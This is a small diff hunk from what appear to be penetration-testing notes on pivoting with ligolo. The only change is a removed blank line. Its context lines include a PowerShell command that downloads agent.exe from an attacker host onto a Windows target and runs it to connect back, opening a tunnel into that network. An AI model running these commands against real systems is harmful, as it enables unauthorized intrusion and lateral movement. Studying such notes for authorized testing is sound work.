@@ -564,7 +564,6 @@ ip route
 # delete old routes
 sudo ip route del 172.16.78.0/24 dev ligolo
 
-
 # from windows target
 iwr -uri http://192.168.45.219:8000/agent.exe -Outfile agent.exe
 ./agent.exe -ignore-cert -connect 192.168.45.219:11601
